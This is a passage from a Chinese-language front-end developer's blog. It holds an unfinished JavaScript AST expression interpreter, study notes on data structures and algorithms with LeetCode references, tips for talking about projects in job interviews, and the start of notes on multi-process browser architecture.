class="property">handle</span>[_context][option] = <span class="keyword">await</span> res;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`<span class="subst">$&#123;_context&#125;</span>中不存在<span class="subst">$&#123;option&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;void&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">await</span> res;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">genFile</span>(<span class="params">name, expression</span>) &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(</span><br><span class="line">      <span class="string">`./<span class="subst">$&#123;name&#125;</span>.json`</span>,</span><br><span class="line">      <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">Parser</span>.<span class="title function_">parse</span>(expression), <span class="literal">null</span>, <span class="string">&quot;  &quot;</span>)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">parse</span>(<span class="params">context, expression</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> ast = <span class="title class_">Parser</span>.<span class="title function_">parse</span>(expression);</span><br><span class="line">    <span class="keyword">const</span> body = ast.<span class="property">body</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (body.<span class="property">type</span> === <span class="string">&quot;ExpressionStatement&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;expression11111111111111111111111&#x27;</span>, expression);</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">executeExpression</span>(context, body.<span class="property">expression</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`不支持<span class="subst">$&#123;body.type&#125;</span>类型`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">executeExpression</span>(<span class="params">context, expression</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (expression.<span class="property">type</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;CallExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">executeCallExpression</span>(context, expression);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;MemberExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">executeMemberExpression</span>(context, expression);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;BinaryExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">executeBinaryExpression</span>(context, expression);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;ConditionalExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;ObjectExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;ArrayExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;Literal&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> expression.<span class="property">value</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;UnaryExpression&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">executeUnaryExpression</span>(context, expression);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;Identifier&quot;</span>: </span><br><span class="line">      <span class="keyword">return</span> expression.<span class="property">value</span>;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`不支持类型<span class="subst">$&#123;expression.type&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">executeMemberExpression</span>(<span class="params">context, expression</span>)  &#123;</span><br><span class="line">    <span class="keyword">const</span> object = <span class="variable language_">this</span>.<span class="title function_">executeExpression</span>(context, expression.<span class="property">object</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(object);</span><br><span class="line">    <span class="comment">// return `$&#123;object.name&#125;.$&#123;expression.property.value&#125;`</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">executeCallExpression</span>(<span class="params">context, expression</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> callee = <span class="variable language_">this</span>.<span class="title function_">executeExpression</span>(context, expression.<span class="property">callee</span>);</span><br><span class="line">    <span class="keyword">return</span> context[callee.<span class="property">name</span>](</span><br><span class="line">      ...expression.<span class="property">arguments</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">v</span>) =&gt;</span> v.<span class="property">value</span>)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">executeBinaryExpression</span>(<span class="params">context, expression</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> left = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">executeExpression</span>(context, expression.<span class="property">left</span>);</span><br><span class="line">    <span class="keyword">const</span> right = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">executeExpression</span>(context, expression.<span class="property">right</span>);</span><br><span class="line">    <span class="keyword">switch</span> (expression.<span class="property">operator</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left + right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left - right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;*&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left * right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left / right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left &gt; right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;&lt;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left &lt; right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;&gt;=&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left &gt;= right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;&lt;=&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left &lt;= right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;==&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left == right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;===&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> left === right;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">executeUnaryExpression</span>(<span class="params">context, expression</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> right = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">executeExpression</span>(context, expression.<span class="property">argument</span>);</span><br><span class="line">    <span class="keyword">switch</span> (expression.<span class="property">operator</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> !right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> -right;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> +right;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> base = <span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line"><span class="keyword">const</span> handle = <span class="keyword">new</span> <span class="title class_">Handle</span>(base);</span><br><span class="line"><span class="keyword">const</span> compile = <span class="keyword">new</span> <span class="title class_">Compile</span>(handle);</span><br><span class="line">compile.<span class="title function_">execute</span>();</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/ast/readme/" data-id="cl51vix6600031svzex2sgs0d" data-title="ast" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-数据结构和算法/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:14.748Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/readme/">数据结构和算法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>用大写 O 表示，定性描述算法运行的时间，有<code>O(1)</code>,<code>O(n)</code>,<code>O(logN)</code>,<code>O(n^2)</code></p>
<h1 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h1><p>用大写 O 表示，算法运行过程中临时占用的内存的度量有<code>O(1)</code>,<code>O(n)</code>,<code>O(logN)</code>,<code>O(n^2)</code></p>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>特点： <strong>有序的数据结构，先进后出</strong></p>
<ol>
<li>栈应用场景</li>
</ol>
<ul>
<li>十进制转二进制</li>
<li>函数调用栈</li>
<li>可以用 Array.push pop 方法模拟栈</li>
</ul>
<ol start="2">
<li>leetcode</li>
</ol>
<ul>
<li>20.有效的括号</li>
<li>144.二叉树的前序遍历 val left right</li>
</ul>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>特点：<strong>有序的数据结构，先进先出</strong></p>
<ol>
<li>队列场景</li>
</ol>
<ul>
<li>js 异步中的任务队列，为什么引入任务队列</li>
</ul>
<ol start="2">
<li>leetcode</li>
</ol>
<ul>
<li>933.计算最近请求次数</li>
</ul>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p>特点： <strong>有序的数据结构，元素存储不连续，用 next 指针连在一起</strong></p>
<ol>
<li>场景</li>
</ol>
<ul>
<li>原型链， 对象的<code>__proto__</code>相当于一个 <code>next</code> 指针，指向构造函数的 <code>prototype</code></li>
<li>使用链表指针获取 <code>JSON</code> 节点值</li>
</ul>
<ol start="2">
<li>和数组的区别</li>
</ol>
<ul>
<li>数组：增删非首尾元素需要移动元素</li>
<li>链表：增删非首尾，只需改 next 指向</li>
</ul>
<ol start="3">
<li>leetcode</li>
</ol>
<ul>
<li>237.删除链表中的节点 - p.next &#x3D; p.next.next</li>
<li>206.反转链表 - 反转两个节点 n-&gt;n+1 n+1 -&gt; n</li>
<li>2.两数相加 -</li>
<li>83.删除排序链表中的重复元素</li>
</ul>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>特点： <strong>无序且唯一的数据结构</strong></p>
<ol>
<li>和栈、链表、队列区别</li>
</ol>
<ul>
<li>集合不可以重复</li>
</ul>
<ol start="2">
<li>应用场景</li>
</ol>
<ul>
<li>ES6 中的集合 Set</li>
<li>可求交集等</li>
</ul>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>特点： <strong>与集合类似，存储唯一值的键值对形式数据结构</strong></p>
<ol>
<li>应用场景</li>
</ol>
<ul>
<li>ES6 中的字段 Map</li>
</ul>
<ol start="2">
<li>leetcode</li>
</ol>
<ul>
<li><ol>
<li>两数之和</li>
</ol>
</li>
</ul>
<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><p>特点： <strong><code>分层</code>数据抽象模型，js 没有树，用 Object 和 Array 构建树</strong></p>
<ul>
<li>深度优先遍历<ul>
<li>反问根节点</li>
<li>对根节点的 children 挨个深度遍历</li>
</ul>
</li>
<li>广度优先遍历<ul>
<li>用队列解决</li>
<li>创建一个队列，根节点入队</li>
<li>将根节点出队将 children 入队</li>
<li>重复队头出队，children 入队</li>
</ul>
</li>
</ul>
<ol>
<li>应用场景</li>
</ol>
<ul>
<li>DOM、级联选择等</li>
<li>二叉树（每个节点最多只能有两个节点）递归<ul>
<li>先序遍历 访问顺序 根-&gt;left-&gt;right</li>
<li>中序遍历 访问顺序 left-&gt;根-&gt;right</li>
<li>后序遍历 访问顺序 left-&gt;right-&gt;根</li>
</ul>
</li>
<li>二叉树（每个节点最多只能有两个节点）非递归<ul>
<li>先序遍历 用栈</li>
<li>中序遍历 用栈</li>
<li>后序遍历 用栈</li>
</ul>
</li>
</ul>
<ol start="2">
<li>leetcode</li>
</ol>
<ul>
<li>104.二叉树的最大深度 - 深度优先</li>
<li>111.二叉树的最小深度 - 广度优先</li>
<li>102.二叉树的层序遍历 - 广度优先</li>
</ul>
<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><p>特点： <strong><code>网络结构</code>抽象模型，由边链接的节点</strong>， js 没有图，可用 Object 和 Array 构建图，图的表示法：邻接矩阵、邻接表</p>
<ol>
<li>应用场景</li>
</ol>
<ul>
<li>道路、航班等路径</li>
</ul>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>特点： <strong>特殊的<code>完全二叉树</code>，所有节点都大于等于（最大堆），或小于等于子（最小堆）节点</strong></p>
<ul>
<li>js 通常用数组表示堆</li>
<li>左侧子节点位置是 2 * index + 1</li>
<li>右侧子节点位置是 2 * index + 2</li>
<li>父节点位置 (index - 1 ) &#x2F; 2 的熵</li>
</ul>
<h1 id="算法设计思想"><a href="#算法设计思想" class="headerlink" title="算法设计思想"></a>算法设计思想</h1><h2 id="分治"><a href="#分治" class="headerlink" title="分治"></a>分治</h2><p>特点： 将问题<code>分</code>为多个和原问题相似的小问题，<code>递归解决</code>小问题，再<code>合并</code></p>
<ol>
<li>leetcode</li>
</ol>
<ul>
<li>374.猜数字大小</li>
</ul>
<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>特点： 将问题分解为相互重叠的子问题，反复求解子问题</p>
<ol>
<li>场景</li>
</ol>
<ul>
<li>斐波那契数列问题</li>
</ul>
<ol start="2">
<li>leetcode</li>
</ol>
<ul>
<li>70.爬楼梯</li>
</ul>
<h2 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h2><p>特点： 期盼通过每个阶段的局部最优选择，达到全局最优，结果不一定是最优</p>
<ol>
<li>leetcode</li>
</ol>
<ul>
<li>455.分饼干</li>
</ul>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>特点： 渐进式寻找并构建问题解决方式策略，选一个可能的动作开始，如果不行回溯再选另一个可能的动作开始，直到问题解决</p>
<ol>
<li>场景</li>
</ol>
<ul>
<li>全排列 (leetcode 46)</li>
</ul>
<h1 id="排序及搜索算法"><a href="#排序及搜索算法" class="headerlink" title="排序及搜索算法"></a>排序及搜索算法</h1><h2 id="冒泡"><a href="#冒泡" class="headerlink" title="冒泡"></a>冒泡</h2><h2 id="快速"><a href="#快速" class="headerlink" title="快速"></a>快速</h2><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><h2 id="归并"><a href="#归并" class="headerlink" title="归并"></a>归并</h2><h2 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h2><h2 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/readme/" data-id="cl51vix5t00021svzgo76c5un" data-title="数据结构和算法" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-面试/项目面" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/%E9%9D%A2%E8%AF%95/%E9%A1%B9%E7%9B%AE%E9%9D%A2/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:14.727Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/%E9%9D%A2%E8%AF%95/%E9%A1%B9%E7%9B%AE%E9%9D%A2/">项目面</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="基于项目面试的一些心得"><a href="#基于项目面试的一些心得" class="headerlink" title="基于项目面试的一些心得"></a>基于项目面试的一些心得</h1><ol>
<li>先讲它是什么（讲完即止，让面试官掌握节奏，避免面试时间过长）</li>
<li>背景</li>
<li>什么作用</li>
<li>技术栈</li>
<li>为什么选择这些技术栈</li>
<li>怎么做</li>
<li>如何维护，扩展</li>
</ol>
<blockquote>
<p>讲的时候一定要清晰，有条理，能让人知道用这个东西的原因，效果。</p>
</blockquote>
<h2 id="接口代码生成工具"><a href="#接口代码生成工具" class="headerlink" title="接口代码生成工具"></a>接口代码生成工具</h2><ul>
<li>是个什么东西：是一个用利用 swagger 文档数据生成的，给前端调用的接口代码，</li>
</ul>
<ol>
<li><strong>为什么做这个东西，那就说一下背景…</strong></li>
</ol>
<ul>
<li>接口太多，项目中接口的管理太混乱，那为了开发时不关注这些接口的文件位置、怎么取函数名、维护类型。通过一个插件一键生成在项目中规定的位置，规范文件结构，自动生成类型，函数名，注释等等，解决了接口管理问题与接口代码解耦，可以提高开发效率</li>
</ul>
<ol start="2">
<li><strong>怎么做的，讲难点…</strong></li>
</ol>
<ul>
<li>文件结构，由 swagger 的 tags 也就是后端一个 control 作为一份 service 文件，文件名为这个 control 的名字，里面包括了这个 control 的接口</li>
<li>函数名的生成，由 swagger 中 paths 生成，接口地址转换驼峰</li>
<li>类型声明生成，根据 swagger 入参，responese 中的 type 或者 schame 的描述，复杂类型利用 schame 的标识生成一个文件，用 import 引入</li>
</ul>
<ol start="3">
<li><strong>怎么使用…</strong></li>
</ol>
<ul>
<li>在项目根目录提供一个配置 js 文件，里面包含了可以配置 swagger 地址，以及要生成的接口范围，排除范围，生成的文件放在哪等配置</li>
<li>使用 package.json、script 命令启动</li>
</ul>
<ol start="4">
<li><strong>可以如何扩展…</strong></li>
</ol>
<ul>
<li>可以扩展其他的接口文档，比如 yapi</li>
<li>可以扩展到编写 vscode 的插件</li>
<li>可以加一些功能比如、根据项目 eslint 修复代码风格</li>
</ul>
<h2 id="vue-的业务脚手架"><a href="#vue-的业务脚手架" class="headerlink" title="vue 的业务脚手架"></a>vue 的业务脚手架</h2><ul>
<li>是个什么东西： 是一个基于 vue-cli preset 工具实现的远程代码模板，这个模板包括了根据部门情况定制的一套规范代码结构，文件结构</li>
</ul>
<ol>
<li><strong>为什么要做？…</strong></li>
</ol>
<ul>
<li>第一，因为之前可能团队更多的项目是 angular 开发的，为了保持一个文件和代码结构的一致性，去模仿他的结构，让团队顺滑切换 vue 和 angular</li>
<li>第二，快速响应需求，因为我们负责的一个系统是，一种 iframe 嵌套的微前端，不同的功能模块那就有可能需要频繁的创建一个新的项目</li>
<li>第三，可以关注社区情况，及时去更新维护自己的一个框架结构，后面就可以使用比较新的技术点了</li>
</ul>
<ol start="2">
<li><strong>怎么使用，那就简单描述生成的流程…</strong></li>
</ol>
<ul>
<li>首先是执行命令 vue create –preset 远程地址</li>
<li>那我们的模板仓库有包含四样东西, <code>template</code>,<code>generator.js</code>,<code>prompts.js</code>,<code>preset,json</code></li>
<li>命令执行之后会先执行 prompt.js 让用户选择环境</li>
<li>再执行<code>generator.js</code>, 暴漏<code>render</code>接口</li>
<li>将<code>render</code>传入<code>tempalte</code></li>
</ul>
<h2 id="基于-stencil-下拉组件"><a href="#基于-stencil-下拉组件" class="headerlink" title="基于 stencil 下拉组件"></a>基于 stencil 下拉组件</h2><ul>
<li>是个什么东西： 是一个包含用户所拥有权限的平台列表点击可跳转的自定义下拉选择框，类似 <code>dropDown</code></li>
</ul>
<ol>
<li><strong>什么是平台呢？那就说一下背景….</strong></li>
</ol>
<ul>
<li>是这样的背景： 像我们电商的有商品管理列表，运营了很多个平台（亚马逊，shopee 等）的商品列表，用户呢，想要在里面的列表去实现不同平台列表之间跳转</li>
</ul>
<ol start="2">
<li><strong>怎么做呢？ 那就说一下项目从里到外，挑难点讲，说一遍….</strong></li>
</ol>
<ul>
<li>首先要有两个接口，一个所有平台的页面地址，另一个是用户拥有的权限平台，这样可以使下拉框展示的是用户所有用权限的平台。</li>
<li>第二是要实现下拉展开，和上拉收起的动画，使用了鼠标移入移除事件，利用 <code>setInterval</code> 监听</li>
<li>第三是要处理边界情况，比如用户未登录提示，用户没权限提示，下拉框的最大高度不能超过浏览器可视区</li>
<li>第四是打包发布，要分为两种发布，一种是 npm 包形式，一种网络资源的访问方式（给前后端不分离的项目用）</li>
</ul>
<ol start="3">
<li><strong>怎么使用？</strong></li>
</ol>
<ul>
<li>自动注册了<code>webcomponent</code>，像我们正常使用的组件一样</li>
</ul>
<ol start="4">
<li><strong>选择的技术</strong></li>
</ol>
<ul>
<li>查了资料：有一个 <code>ionic-team</code> 正在做 <code>webcomponent</code> 的工程，他有一个 <code>stencil</code> 的框架，他是基于 <code>webcomponent</code> 的框架，提供了一套很好的方案</li>
</ul>
<ol start="5">
<li><strong>为什么选这个呢？</strong></li>
</ol>
<p>一，体积小<br>二，运行时性能高<br>三，标准，面向未来<br>四，与 angular 写法相似，团队较容易容纳<br>五，引入新的技术，提高团队学习热情<br>六，可以接纳不同的技术栈</p>
<ul>
<li>相对于 <code>vue，angular</code> 所提供的 <code>webcomponent</code>，他们是需要本身框架的支持，也就是说想要用那就得引入他们的框架，也就会造成一个组件体积比较大的问题，通过相同组件去打包对比大小。</li>
<li>性能用 <code>performance</code> 工具 查看 <code>script</code> 和 <code>render</code> 执行时间</li>
<li>采用了 <code>jsx、typescript、Virtual Dom</code>，弥补 <code>webcomponent</code> 不能传对象问题</li>
</ul>
<h2 id="基于-ng-ant-desgin-组件库"><a href="#基于-ng-ant-desgin-组件库" class="headerlink" title="基于 ng-ant-desgin 组件库"></a>基于 ng-ant-desgin 组件库</h2><ol>
<li><strong>主要的职责？</strong></li>
</ol>
<ul>
<li>将部门不同版本的组件收集，并将发布</li>
</ul>
<h2 id="使用-json，ast-配置快速生成页面"><a href="#使用-json，ast-配置快速生成页面" class="headerlink" title="使用 json，ast 配置快速生成页面"></a>使用 json，ast 配置快速生成页面</h2><h2 id="keepeact-框架"><a href="#keepeact-框架" class="headerlink" title="keepeact 框架"></a>keepeact 框架</h2><ol>
<li><strong>是什么？</strong><br>是一个小型 mvvm 框架，使用 <code>jsx</code> 开发，为开发者提供一套声明式框架，最终将组件挂载到jq的扩展方法上。使用框架时需要依赖jq。</li>
<li><strong>背景</strong><br>是什么背景会去产生这个框架的？为什么vue，angular等不行？<br>jq等旧页面需要前端提供组件，或者需要和新页面统一组件，比如：多选框，平台选择框<br>vue和angular都行，都有自定义元素的功能，但是打包出来的体积vue大概有app+vendors大概有100kb，并且定位是组件库，有大材小用嫌疑。</li>
<li>优点</li>
</ol>
<ul>
<li>声明式</li>
<li>jsx，tsx面向未来</li>
<li>有diff算法支持，性能有保障</li>
</ul>
<ol start="4">
<li>缺点</li>
</ol>
<ul>
<li>需要手动update，无自动依赖收集</li>
</ul>
<ol start="5">
<li><strong>难点</strong></li>
</ol>
<ul>
<li>如何利用jq扩展</li>
<li>如何定制生命周期<br>beforeMount<br>|<br>mount<br>|<br>mounted<br>|<br>writeValue<br>|<br>valueChange</li>
<li>patch原理</li>
<li>如何通讯</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/%E9%9D%A2%E8%AF%95/%E9%A1%B9%E7%9B%AE%E9%9D%A2/" data-id="cl51vix5e00011svz9lm3clvd" data-title="项目面" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-browser/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/browser/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T02:53:05.398Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/browser/readme/">浏览器进程</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="单进程浏览器"><a href="#单进程浏览器" class="headerlink" title="单进程浏览器"></a>单进程浏览器</h2><p>早期时代的浏览器是单进程的，顾名思义。<strong>单进程浏览器是指浏览器的所有功能模块都是运行在同一个进程的，包括网络、插件、js 运行环境、渲染引擎和页面等</strong>。</p>
<p>单进程浏览器的架构如下图：<br><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-30%20223137.png" alt="屏幕截图 2021-11-30 223137"><br>问题显而易见：</p>
<ol>
<li><strong>不稳定</strong>： 网络、插件、js 运行环境、渲染引擎和页面任何一个意外的崩溃，都会导致整个浏览器崩溃</li>
<li><strong>不流畅</strong>：比如页面线程包含了 js 运行环境，页面渲染，和其他的模块，意味着同一线程同一时刻只能有一个模块运行，如果 js 过大，或者进入无限循环，那么其他模块就没有机会运行，造成卡顿的感觉<br><code>页面的内存泄漏</code>也是单进程变慢的原因，运行一个复杂点的页面再关闭页面。会存在内存不能完全回收的情况，这样导致约积占用内存越高，浏览器变得越慢</li>
<li><strong>不安全</strong>：前面所说，插件的模块也是存在于同一个进程，那么其他模块就有可能收到插件模块的影响，通过插件可以获取系统任意资源，当你在页面运行一个插件时，意味着这个插件能够操作你的电脑，可能释放病毒，窃取密码等</li>
</ol>
<h2 id="多进程浏览器"><a href="#多进程浏览器" class="headerlink" title="多进程浏览器"></a>多进程浏览器</h2><p>现在的浏览器就是<code>多进程浏览器</code>，先看看现在的<code>多进程浏览器架构</code>，以<code>Chrome</code>为例，扔一张图看看:</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-30%20225146.png" alt="屏幕截图 2021-11-30 225146"></p>
<p>从图中可以看出最新的<code>Chrome</code>浏览器： <code>1个浏览器主进程</code>、<code>1个GPU进程</code>、<code>1个网络进程</code>、<code>多个渲染进程</code>和<code>多个插件进程</code></p>
<ul>
<li><strong>浏览器进程</strong>：负责界面显示、子进程管理等，同时提供存储功能，localStorage、cookie、session 能力</li>
<li><strong>渲染进程</strong>：核心任务将 HTML、CSS 和 JS 转换为网页，排版引擎，V8 引擎都是运行在该进程中，默认情况，一个 tab 创建一个渲染进程，<strong>同域共享同一个渲染进程</strong>，处于安全考虑，运行在沙箱模式下</li>
<li><strong>GPU 进程</strong>：用于 UI 界面 GPU 绘制</li>
<li><strong>网络进程</strong>：负责网络资源加载</li>
<li><strong>插件进程</strong>：负责浏览器插件运行</li>
<li>等等</li>
</ul>
<p>可以看出，多进程的浏览器提升了浏览器的<code>稳定性</code>、<code>流畅性</code>、以及<code>安全性</code>，但不可避免带来一些问题：</p>
<ul>
<li>更高的资源占用： 这么多的进程，那么意味着浏览器会消耗更多的内存（其实现在电脑配置都这么高了，这点其实不主要）</li>
<li>更复杂的体系架构： 浏览器各模块之间的扩展性差等问题，导致现在架构很难适应新需求</li>
</ul>
<p>不过有好消息，为了解决以上问题，<code>Chrome</code>团队使用 <strong>面向服务的架构（SOA）</strong> 思想，就是说<code>Chrome</code>整体架构会朝向现代操作系统所采用的 <strong>面向服务的架构（SOA）</strong>，如图：</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-30%20231753.png" alt="20231753"></p>
<p><code>Chrome</code> 最终要把 UI、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，这一步正在逐步构建。</p>
<h1 id="从输入-url-到页面展示，发生了什么？"><a href="#从输入-url-到页面展示，发生了什么？" class="headerlink" title="从输入 url 到页面展示，发生了什么？"></a>从输入 url 到页面展示，发生了什么？</h1><h2 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h2><ul>
<li>判断关键词</li>
<li>如果是搜索内容，则地址栏会使用浏览器搜索引擎</li>
<li>如果是符合 <code>URL</code> 规则，则合成完整的 <code>URL</code></li>
<li>回车之后，浏览器会给当前的页面执行一次 <code>beforeunload</code>，可以用来取消导航</li>
</ul>
